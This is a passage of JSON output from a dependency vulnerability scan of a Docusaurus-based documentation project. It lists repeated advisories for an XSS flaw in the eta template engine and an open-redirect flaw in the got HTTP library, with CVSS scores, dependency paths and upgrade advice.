          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/releases/tag/v2.0.0",
          "title": "GitHub Release"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "modificationTime": "2023-02-14T15:04:12.598888Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via `renderFile` function, due to improper user-input sanitization. \r\n\r\n## Workaround\r\n\r\nUsers who are unable to upgrade should not pass user supplied data directly to `res.renderFile`.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [GitHub Release](https://github.com/eta-dev/eta/releases/tag/v2.0.0)\n",
      "epssDetails": {
        "percentile": "0.18312",
        "probability": "0.00052",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2023-23630"
        ],
        "CWE": [
          "CWE-79"
        ],
        "GHSA": [
          "GHSA-xrh7-m5pp-39r6"
        ]
      },
      "packageName": "eta",
      "proprietary": false,
      "creationTime": "2023-02-01T09:24:55.728670Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2023-01-31T22:39:40Z",
      "packageManager": "npm",
      "publicationTime": "2023-02-01T13:47:00.613727Z",
      "modificationTime": "2023-02-14T15:04:12.598888Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-pages@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/theme-classic@2.3.1",
        "@docusaurus/theme-common@2.3.1",
        "@docusaurus/plugin-content-pages@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-3261240",
      "title": "Cross-site Scripting (XSS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Agustin Gianni"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/releases/tag/v2.0.0",
          "title": "GitHub Release"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "modificationTime": "2023-02-14T15:04:12.598888Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via `renderFile` function, due to improper user-input sanitization. \r\n\r\n## Workaround\r\n\r\nUsers who are unable to upgrade should not pass user supplied data directly to `res.renderFile`.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [GitHub Release](https://github.com/eta-dev/eta/releases/tag/v2.0.0)\n",
      "epssDetails": {
        "percentile": "0.18312",
        "probability": "0.00052",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2023-23630"
        ],
        "CWE": [
          "CWE-79"
        ],
        "GHSA": [
          "GHSA-xrh7-m5pp-39r6"
        ]
      },
      "packageName": "eta",
      "proprietary": false,
      "creationTime": "2023-02-01T09:24:55.728670Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2023-01-31T22:39:40Z",
      "packageManager": "npm",
      "publicationTime": "2023-02-01T13:47:00.613727Z",
      "modificationTime": "2023-02-14T15:04:12.598888Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-search-algolia@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-pages@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/theme-search-algolia@2.3.1",
        "@docusaurus/theme-common@2.3.1",
        "@docusaurus/plugin-content-pages@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-GOT-2932019",
      "title": "Open Redirect",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "<11.8.5",
          ">=12.0.0 <12.1.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "11.8.5",
        "12.1.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "got",
      "references": [
        {
          "url": "https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0",
          "title": "GitHub Diff"
        },
        {
          "url": "https://github.com/sindresorhus/got/pull/2047",
          "title": "GitHub PR"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-06-29T01:11:26.531842Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-11-19T20:57:05.871669Z"
        }
      ],
      "description": "## Overview\n\nAffected versions of this package are vulnerable to Open Redirect due to missing verification of requested URLs. It allowed a victim to be redirected to a UNIX socket.\n## Remediation\nUpgrade `got` to version 11.8.5, 12.1.0 or higher.\n## References\n- [GitHub Diff](https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0)\n- [GitHub PR](https://github.com/sindresorhus/got/pull/2047)\n",
      "epssDetails": {
        "percentile": "0.22655",
        "probability": "0.00058",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-33987"
        ],
        "CWE": [
          "CWE-601"
        ]
      },
      "packageName": "got",
      "proprietary": false,
      "creationTime": "2022-06-19T09:23:24.210132Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-19T08:33:16Z",
      "packageManager": "npm",
      "publicationTime": "2022-06-19T15:33:44.269688Z",
      "modificationTime": "2022-11-19T20:57:05.871669Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/core@2.2.0",
        "update-notifier@5.1.0",
        "latest-version@5.1.0",
        "package-json@6.5.0",
        "got@9.6.0"
      ],
      "upgradePath": [
        false,
        false,
        "update-notifier@6.0.0",
        "latest-version@6.0.0",
        "package-json@7.0.0",
        "got@11.8.5"
      ],
      "version": "9.6.0",
      "name": "got",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-GOT-2932019",
      "title": "Open Redirect",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "<11.8.5",
          ">=12.0.0 <12.1.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "11.8.5",
        "12.1.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "got",
      "references": [
        {
          "url": "https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0",
          "title": "GitHub Diff"
        },
        {
          "url": "https://github.com/sindresorhus/got/pull/2047",
          "title": "GitHub PR"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-06-29T01:11:26.531842Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-11-19T20:57:05.871669Z"
        }
      ],
      "description": "## Overview\n\nAffected versions of this package are vulnerable to Open Redirect due to missing verification of requested URLs. It allowed a victim to be redirected to a UNIX socket.\n## Remediation\nUpgrade `got` to version 11.8.5, 12.1.0 or higher.\n## References\n- [GitHub Diff](https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0)\n- [GitHub PR](https://github.com/sindresorhus/got/pull/2047)\n",
      "epssDetails": {
        "percentile": "0.22655",
        "probability": "0.00058",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-33987"
        ],
        "CWE": [
          "CWE-601"
        ]
      },
      "packageName": "got",
      "proprietary": false,
      "creationTime": "2022-06-19T09:23:24.210132Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-19T08:33:16Z",
      "packageManager": "npm",
      "publicationTime": "2022-06-19T15:33:44.269688Z",
      "modificationTime": "2022-11-19T20:57:05.871669Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/core@2.2.0",
        "update-notifier@5.1.0",
        "latest-version@5.1.0",
        "package-json@6.5.0",
        "got@9.6.0"
      ],
      "upgradePath": [
        false,
        false,
        false,
        "update-notifier@6.0.0",
        "latest-version@6.0.0",
        "package-json@7.0.0",
        "got@11.8.5"
      ],
      "version": "9.6.0",
      "name": "got",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-GOT-2932019",
      "title": "Open Redirect",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "<11.8.5",
          ">=12.0.0 <12.1.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "11.8.5",
        "12.1.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "got",
      "references": [
        {
          "url": "https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0",
          "title": "GitHub Diff"
        },
        {
          "url": "https://github.com/sindresorhus/got/pull/2047",
          "title": "GitHub PR"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-06-29T01:11:26.531842Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-11-19T20:57:05.871669Z"
        }
      ],
      "description": "## Overview\n\nAffected versions of this package are vulnerable to Open Redirect due to missing verification of requested URLs. It allowed a victim to be redirected to a UNIX socket.\n## Remediation\nUpgrade `got` to version 11.8.5, 12.1.0 or higher.\n## References\n- [GitHub Diff](https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0)\n- [GitHub PR](https://github.com/sindresorhus/got/pull/2047)\n",
      "epssDetails": {
        "percentile": "0.22655",
        "probability": "0.00058",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-33987"
        ],
        "CWE": [
          "CWE-601"
        ]
      },
      "packageName": "got",
      "proprietary": false,
      "creationTime": "2022-06-19T09:23:24.210132Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-19T08:33:16Z",
      "packageManager": "npm",
      "publicationTime": "2022-06-19T15:33:44.269688Z",
      "modificationTime": "2022-11-19T20:57:05.871669Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/plugin-google-analytics@2.4.3",
        "@docusaurus/core@2.4.3",
        "update-notifier@5.1.0",
        "latest-version@5.1.0",
        "package-json@6.5.0",
        "got@9.6.0"
      ],
      "upgradePath": [
        false,
        false,
        false,
        "update-notifier@6.0.0",
        "latest-version@6.0.0",
        "package-json@7.0.0",
        "got@11.8.5"
      ],
      "version": "9.6.0",
      "name": "got",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-GOT-2932019",
      "title": "Open Redirect",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "<11.8.5",
          ">=12.0.0 <12.1.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "11.8.5",
        "12.1.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "got",
      "references": [
        {
          "url": "https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0",
          "title": "GitHub Diff"
        },
        {
          "url": "https://github.com/sindresorhus/got/pull/2047",
          "title": "GitHub PR"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-06-29T01:11:26.531842Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-11-19T20:57:05.871669Z"
        }
      ],
      "description": "## Overview\n\nAffected versions of this package are vulnerable to Open Redirect due to missing verification of requested URLs. It allowed a victim to be redirected to a UNIX socket.\n## Remediation\nUpgrade `got` to version 11.8.5, 12.1.0 or higher.\n## References\n- [GitHub Diff](https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0)\n- [GitHub PR](https://github.com/sindresorhus/got/pull/2047)\n",
      "epssDetails": {
        "percentile": "0.22655",
        "probability": "0.00058",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-33987"
        ],
        "CWE": [
          "CWE-601"
        ]
      },
      "packageName": "got",
      "proprietary": false,
      "creationTime": "2022-06-19T09:23:24.210132Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-19T08:33:16Z",
      "packageManager": "npm",
      "publicationTime": "2022-06-19T15:33:44.269688Z",
      "modificationTime": "2022-11-19T20:57:05.871669Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/plugin-google-gtag@2.4.3",
        "@docusaurus/core@2.4.3",
        "update-notifier@5.1.0",
        "latest-version@5.1.0",
        "package-json@6.5.0",
        "got@9.6.0"
      ],
      "upgradePath": [
        false,
        false,
        false,
        "update-notifier@6.0.0",
        "latest-version@6.0.0",
        "package-json@7.0.0",
        "got@11.8.5"
      ],
      "version": "9.6.0",
      "name": "got",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-GOT-2932019",
      "title": "Open Redirect",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "<11.8.5",
          ">=12.0.0 <12.1.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "11.8.5",
        "12.1.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "got",
      "references": [
        {
          "url": "https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0",
          "title": "GitHub Diff"
        },
        {
          "url": "https://github.com/sindresorhus/got/pull/2047",
          "title": "GitHub PR"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-06-29T01:11:26.531842Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-11-19T20:57:05.871669Z"
        }
      ],
      "description": "## Overview\n\nAffected versions of this package are vulnerable to Open Redirect due to missing verification of requested URLs. It allowed a victim to be redirected to a UNIX socket.\n## Remediation\nUpgrade `got` to version 11.8.5, 12.1.0 or higher.\n## References\n- [GitHub Diff](https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0)\n- [GitHub PR](https://github.com/sindresorhus/got/pull/2047)\n",
      "epssDetails": {
        "percentile": "0.22655",
        "probability": "0.00058",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-33987"
        ],
        "CWE": [
          "CWE-601"
        ]
      },
      "packageName": "got",
      "proprietary": false,
      "creationTime": "2022-06-19T09:23:24.210132Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-19T08:33:16Z",
      "packageManager": "npm",
      "publicationTime": "2022-06-19T15:33:44.269688Z",
      "modificationTime": "2022-11-19T20:57:05.871669Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/plugin-content-blog@2.2.0",
        "@docusaurus/core@2.2.0",
        "update-notifier@5.1.0",
        "latest-version@5.1.0",
        "package-json@6.5.0",
        "got@9.6.0"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        "update-notifier@6.0.0",
        "latest-version@6.0.0",
        "package-json@7.0.0",
        "got@11.8.5"
      ],
      "version": "9.6.0",
      "name": "got",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-GOT-2932019",
      "title": "Open Redirect",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "<11.8.5",
          ">=12.0.0 <12.1.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "11.8.5",
        "12.1.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "got",
      "references": [
        {
          "url": "https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0",
          "title": "GitHub Diff"
        },
        {
          "url": "https://github.com/sindresorhus/got/pull/2047",
          "title": "GitHub PR"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-06-29T01:11:26.531842Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-11-19T20:57:05.871669Z"
        }
      ],
      "description": "## Overview\n\nAffected versions of this package are vulnerable to Open Redirect due to missing verification of requested URLs. It allowed a victim to be redirected to a UNIX socket.\n## Remediation\nUpgrade `got` to version 11.8.5, 12.1.0 or higher.\n## References\n- [GitHub Diff](https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0)\n- [GitHub PR](https://github.com/sindresorhus/got/pull/2047)\n",
      "epssDetails": {
        "percentile": "0.22655",
        "probability": "0.00058",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-33987"
        ],
        "CWE": [
          "CWE-601"
        ]
      },
      "packageName": "got",
      "proprietary": false,
      "creationTime": "2022-06-19T09:23:24.210132Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-19T08:33:16Z",
      "packageManager": "npm",
      "publicationTime": "2022-06-19T15:33:44.269688Z",
      "modificationTime": "2022-11-19T20:57:05.871669Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/plugin-content-docs@2.2.0",
        "@docusaurus/core@2.2.0",
        "update-notifier@5.1.0",
        "latest-version@5.1.0",
        "package-json@6.5.0",
        "got@9.6.0"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        "update-notifier@6.0.0",
        "latest-version@6.0.0",
        "package-json@7.0.0",
        "got@11.8.5"
      ],
      "version": "9.6.0",
      "name": "got",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-GOT-2932019",
      "title": "Open Redirect",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "<11.8.5",
          ">=12.0.0 <12.1.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "11.8.5",
        "12.1.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "got",
      "references": [
        {
          "url": "https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0",
          "title": "GitHub Diff"
        },
        {
          "url": "https://github.com/sindresorhus/got/pull/2047",
          "title": "GitHub PR"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
